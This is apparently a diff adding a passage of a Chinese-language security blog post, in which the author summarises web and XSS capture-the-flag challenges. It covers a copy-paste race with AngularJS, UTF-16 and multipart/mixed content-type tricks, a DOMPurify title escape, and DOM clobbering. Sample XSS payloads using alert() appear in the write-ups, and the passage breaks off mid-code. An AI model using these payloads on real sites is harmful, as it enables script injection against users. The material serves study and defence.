@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>一堆來不及做的 web 與 XSS 題目 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2023/12/03/en/xss-and-web-challenges/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2023/12/03/xss-and-web-challenges/">
+    
+
+
+
+
+
+    <meta name="description" content="因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。 這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。 關鍵字列表：  copy paste XSS connection pool content type UTF16 multipa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一堆來不及做的 web 與 XSS 題目">
+<meta property="og:url" content="https://blog.huli.tw/2023/12/03/xss-and-web-challenges/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。 這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。 關鍵字列表：  copy paste XSS connection pool content type UTF16 multipa">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-and-web-challenges/cover.png">
+<meta property="article:published_time" content="2023-12-03T04:40:00.000Z">
+<meta property="article:modified_time" content="2023-12-03T05:16:22.706Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-and-web-challenges/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="一堆來不及做的 web 與 XSS 題目" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#dom-based-race-condition">1&nbsp;&nbsp;<b>DOM-based race condition</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#罕見的-content-type-與-utf16">2&nbsp;&nbsp;<b>罕見的 Content-type 與 UTF16</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#intigriti-october-2023-challenge">3&nbsp;&nbsp;<b>Intigriti October 2023 challenge</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#dom-clobbering">4&nbsp;&nbsp;<b>DOM clobbering</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#lakectf-2023-geoguessy">5&nbsp;&nbsp;<b>LakeCTF 2023 GeoGuessy</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#n1ctf-ytiruces">6&nbsp;&nbsp;<b>N1CTF - ytiruces</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#werkzeug-cookie-parsing-quirks">7&nbsp;&nbsp;<b>Werkzeug cookie parsing quirks</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2023/12/03/en/xss-and-web-challenges/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            一堆來不及做的 web 與 XSS 題目
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2023-12-03T04:40:00.000Z" itemprop="datePublished">2023年12月3日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。</p>
+<p>這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。</p>
+<p>關鍵字列表：</p>
+<ol>
+<li>copy paste XSS</li>
+<li>connection pool</li>
+<li>content type UTF16</li>
+<li>multipart&#x2F;mixed</li>
+<li>Chrome DevTools Protocol</li>
+<li>new headless mode default download</li>
+<li>Scroll to Text Fragment (STTF)</li>
+<li>webVTT cue xsleak</li>
+<li>flask&#x2F;werkzeug cookie parsing quirks</li>
+</ol>
+<span id="more"></span>
+
+<h2><span id="dom-based-race-condition">DOM-based race condition</span></h2><p>來源：<a target="_blank" rel="noopener" href="https://twitter.com/ryotkak/status/1710291366654181749">https://twitter.com/ryotkak/status/1710291366654181749</a></p>
+<p>題目很簡單，就給你一個可編輯的 div 加上 Angular，允許任何的 user interaction，要做到 XSS。</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">contenteditable</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://angular-no-http3.ryotak.net/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>當初看到題目的時候有猜到應該跟 copy paste 有關，解答中有提到說在 <code>&lt;div contenteditable&gt;&lt;/div&gt;</code> 貼上內容時，是可以貼上 HTML 的。雖然瀏覽器後來有做 sanitizer，但並不會針對自訂的屬性。</p>
+<p>也就是說，如果搭配其他 gadget 的話，還是有機會做到 XSS。</p>
+<p>例如說作者的文章中提到的這個 pattern，因為有 AngularJS 的關係所以會執行程式碼：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>constructor.constructor('alert(1)')()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但問題是使用者在貼入 payload 的時候，AngularJS 已經載入完畢了。載入完成的時候如果 payload 還不存在，那就不會被執行，所以需要延長 AngularJS 載入的時間。</p>
+<p>最後作者是用 connection pool 來解決這問題的，就是把 pool 塞爆，就可以延長 script 的載入時間，在載入完成以前貼好 payload。</p>
+<p>作者 writeup：<a target="_blank" rel="noopener" href="https://blog.ryotak.net/post/dom-based-race-condition/">https://blog.ryotak.net/post/dom-based-race-condition/</a></p>
+<h2><span id="罕見的-content-type-與-utf16">罕見的 Content-type 與 UTF16</span></h2><p>來源：<a target="_blank" rel="noopener" href="https://twitter.com/avlidienbrunn/status/1703805922043220273">https://twitter.com/avlidienbrunn/status/1703805922043220273</a></p>
+<p>題目如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/*
+FROM php:7.0-apache
+
+RUN a2dismod status
+
+COPY ./files/index.php /var/www/html
+COPY ./files/harder.php /var/www/html
+EXPOSE 80
+
+*/</span>
+<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'hello, world'</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/<span class="token interpolation"><span class="token variable">$type</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"X-Frame-Options: DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"plain"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"the message is: <span class="token interpolation"><span class="token variable">$message</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>The message is:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/([^\s\w!-~]|")/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+solved by:
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span> nobody yet!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以控制部分內容以及部分 content type，該怎麼做到 XSS？</p>
+<p>第一招是讓 content type 為 <code>text/html; charset=UTF-16LE</code>，就可以讓瀏覽器把頁面解讀為 UTF16，控制輸出內容。</p>
+<p>這招讓我想到了 <a href="https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/">UIUCTF 2022</a> 中的 modernism 那題。</p>
+<p>第二招是先運用 content type header 的特性，當 response header 是 <code>Content-Type: text/x,image/gif</code> 時，因為 <code>text/x</code> 是非法的 content type，所以瀏覽器會優先看合法的 <code>image/gif</code>。</p>
+<p>也就是說，儘管 content type 的前半段是寫死的，依然可以利用這個技巧覆蓋掉完整的 content type。而有一個古老的 content type 叫做 <code>multipart/mixed</code>，像是 response 版的 multipart&#x2F;form，可以輸出像這樣的 response：</p>
+<pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
+Content-type: multipart&#x2F;mixed;boundary&#x3D;&quot;8ormorebytes&quot;
+
+
+ignored_first_part_before_boundary
+
+--8ormorebytes
+Content-Type: text&#x2F;html
+
+&lt;img src&#x3D;x onerror&#x3D;alert(domain)&gt;
+
+--8ormorebytes
+
+ignored_last_part<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>瀏覽器會挑自己看得懂的部分去 render，而 Firefox 有支援這個 content type。</p>
+<p>話說這個 content type 還可以拿來繞過 CSP，可以參考這個連結：<a target="_blank" rel="noopener" href="https://twitter.com/ankursundara/status/1723410507389129092">https://twitter.com/ankursundara/status/1723410507389129092</a></p>
+<h2><span id="intigriti-october-2023-challenge">Intigriti October 2023 challenge</span></h2><p>題目：<a target="_blank" rel="noopener" href="https://challenge-1023.intigriti.io/">https://challenge-1023.intigriti.io/</a></p>
+<p>在後端有個注入點：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge - &lt;%- title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>這個 title 來自於：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getTitle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">path</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    path <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>雖然說是 DOMPurify，看似不可繞過，但其實用 <code>&lt;div id=&quot;&lt;/title&gt;&lt;h1&gt;hello&lt;/h1&gt;&quot;&gt;</code> 可以閉合前面的 <code>&lt;title&gt;</code>，就可以注入任意 tag。</p>
+<p>但這題的 input 是來自於 path，所以要把一些 <code>/</code> 弄掉，這邊最後是利用 <code>innerHTML</code> 會把屬性 decode 的特性，用 <code>&amp;sol;</code> 來取代 <code>/</code>，最後湊出這樣的 payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&lt;p id&#x3D;&quot;&lt;%26sol%3Btitle&gt;&lt;script&gt;alert()&lt;%26sol%3Bscript&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>這題的目標是要讀本地檔案，所以 XSS 是不夠的，下一步要想辦法從 XSS 繼續往下延伸。</p>
+<p>這題的 flag 有 <code>--disable-web-security</code>，SOP 被關掉了，可以讀到其他來源的 response，而 CDP 有 origin 的限制沒辦法完全使用，但有部分功能可以，例如說開啟一個新網頁之類的。</p>
+<p>但因為檔案在本地，所以只有 <code>file:///</code> 開頭的檔案可以讀到其他本地檔案，因此目標就變成要想辦法在本地弄出一個檔案。</p>
+<p>解法是在新的 headless mode 中，下載功能是預設開啟的，所以只要觸發下載以後，就會把檔案存到固定規則的位置，用 CDP 打開以後即可。</p>
+<p>作者 writeup：<a target="_blank" rel="noopener" href="https://mizu.re/post/intigriti-october-2023-xss-challenge">https://mizu.re/post/intigriti-october-2023-xss-challenge</a></p>
+<h2><span id="dom-clobbering">DOM clobbering</span></h2><p>來源：<a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1697625861543923906">https://twitter.com/kevin_mizu/status/1697625861543923906</a></p>
+<p>題目是一個自製的 sanitizer：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Sanitizer</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360</span>
+    <span class="token constant">DEFAULT_TAGS</span>  <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token comment">/* ... */</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">config<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>version <span class="token operator">=</span> <span class="token string">"2.0.0"</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>creator <span class="token operator">=</span> <span class="token string">"@kevin_mizu"</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span>
+            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"body"</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">tag</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span>
+            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">attr</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924</span>
+    <span class="token function-variable function">_isClobbered</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">elm</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>
+            elm <span class="token keyword">instanceof</span> <span class="token class-name">HTMLFormElement</span> <span class="token operator">&amp;&amp;</span>
+            <span class="token punctuation">(</span><span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>nodeName <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>textContent <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeChild <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>
+            <span class="token operator">!</span><span class="token punctuation">(</span>elm<span class="token punctuation">.</span>attributes <span class="token keyword">instanceof</span> <span class="token class-name">NamedNodeMap</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>setAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>insertBefore <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>
+            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>hasChildNodes <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028</span>
+    <span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>
+        <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>
+                    childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                    currentNode<span class="token punctuation">.</span>nextSibling
+                <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
